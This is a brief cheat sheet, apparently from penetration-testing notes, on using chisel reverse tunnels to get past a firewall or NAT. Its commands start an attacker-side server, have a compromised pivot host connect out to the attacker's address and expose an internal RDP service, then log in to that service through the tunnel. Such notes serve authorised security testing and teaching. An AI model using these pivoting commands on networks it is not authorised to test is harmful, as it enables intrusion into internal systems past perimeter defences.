✅ Purpose

Bypasses firewall/NAT using reverse tunnels

🧠 Concept
Attacker = server
Pivot = client
⚙️ Step 1: Start Server (Attacker)

chisel server -p 8000 --reverse

🔍 Explanation
-p 8000 → Listening port
--reverse → Allow reverse tunnels
⚙️ Step 2: Connect from Pivot

chisel client 10.10.10.1:8000 R:33389:192.168.1.10:3389

🔍 Explanation
R: → Reverse tunnel
33389 → Port opened on attacker
192.168.1.10:3389 → Internal target
🎯 Access

xfreerdp /v:127.0.0.1:33389 /u:user /p:pass
